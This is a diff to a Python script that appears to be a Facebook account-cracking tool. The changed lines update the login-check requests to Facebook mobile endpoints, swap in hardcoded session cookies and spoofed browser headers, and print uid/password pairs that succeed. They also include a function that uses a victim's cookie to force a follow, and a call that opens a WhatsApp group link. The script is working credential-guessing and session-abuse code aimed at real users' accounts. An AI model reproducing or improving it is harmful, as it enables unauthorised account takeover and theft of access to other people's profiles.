@@ -377,22 +377,22 @@ def follow(ses,coki):
 	r = sop(ses.get('https://mbasic.facebook.com/profile', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
-os.system ("xdg-open https://chat.whatsapp.com/HjhnmgIeHtq9LhpH4xhCkM")
+os.system ("xdg-open https://chat.whatsapp.com/J54ds3VTt2292ZaT4vYoJq")
 logo = ("""\033[1;30m
 \033[0;92m    CHAUDHARY[✓]New Free Command enjoy™️
 \033[1;97m----------------------------------------------\033[1;97m
 \033[0;37m   _____ _____ _____ _____ 
 \033[0;37m   |  _  |  |  | __  |   __|
 \033[0;37m   |   __|  |  | __ -|  |  |
-\033[0;37m   |__|  |_____|_____|_____|\033[0;32mXD
+\033[0;37m   |__|  |_____|_____|_____|\033[0;32m𝙓𝘿
 \033[1;97m----------------------------------------------\033[1;97m
 \033[1;31m  I m not a programmer just start learning =)
 \033[1;97m----------------------------------------------\033[1;97m
   \033[1;37m[√]  Auther    : \033[1;37mCH Tabish
   \033[1;37m[√]  YouTube   : \033[1;37mCHAUDHARY TABISH
   \033[1;37m[√]  Status    : \033[1;37mFree and Enjoy  
-  \033[1;37m[√]  Admin     : \033[1;37mMr SHAFAQAT 
-  \033[0;97m[√]  𝙑𝙀𝙍𝙎i𝙊𝙉   :\033[1;31m A.135
+  \033[1;37m[√]  Admin     : \033[1;37mMr SHAFAQAT
+  \033[0;97m[√]  𝐕𝐄𝐑𝐒𝐈𝐎𝐍   :\033[1;31m A.142
 \033[1;97m----------------------------------------------\033[1;37m""")
 class Main:
 	def __init__(self):
@@ -830,15 +830,15 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'mbasic.facebook.com',
+    'authority': 'd.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-PK,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=kBx8ZX8wF2uRbFKg_Y0qsT4U; sb=kBx8ZQNG4NiJ_kZBVhK061qw; m_pixel_ratio=2.8125; wd=384x745; fr=0RL6yePq1zuO56vDv..BlfByQ.nC.AAA.0.0.BlfByR.AWUE5rFeP3o',
+    'cookie': 'datr=QimIZQsMEVwJwcWafCUXV6s-; sb=QimIZbMPr3O1K1hF3Lu3i0ti; m_pixel_ratio=2.8125; wd=384x745; fr=01Olyn05U2EOscpFh..BliClC.MK.AAA.0.0.BliCli.AWVK-81Fooo',
     'dpr': '2.8125',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"IN2019"',
     'sec-ch-ua-platform': '"Android"',
@@ -849,9 +849,8 @@ class Main:
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
-			response = ses.get("https://mbasic.facebook.com/', cookies=cookies, headers=headers") 
+    'viewport-width': '980',}
+			response = ses.get('https://d.facebook.com/', cookies=cookies, headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
 				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
@@ -1273,28 +1272,27 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'free.facebook.com',
+    'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-PK,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=Om9-ZWCeV9SOdOLZi6cql_Fb; sb=Om9-ZVmUclIFRSHo00fiXzoZ; m_pixel_ratio=2.8125; wd=384x745; fr=0tDh0aPkoaZu0pFZn..Blfm86.xx.AAA.0.0.Blfm9s.AWVpxzpJ51I',
+    'cookie': 'datr=NOeGZf3EbQz2EX597AM-JQI8; sb=NOeGZSf3N_UbaKoxvBPHyGvf; m_pixel_ratio=2.8125; wd=384x745; fr=0gt5ebELz807qMwrB..Blhuc0.13.AAA.0.0.BlhudU.AWVb8VddGsc',
     'dpr': '2.8125',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"IN2019"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
-			response = ses.get("https://free.facebook.com/', cookies=cookies, headers=headers") 
+    'viewport-width': '980',}
+			response = ses.get('https://x.facebook.com/', params=params, cookies=cookies, headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
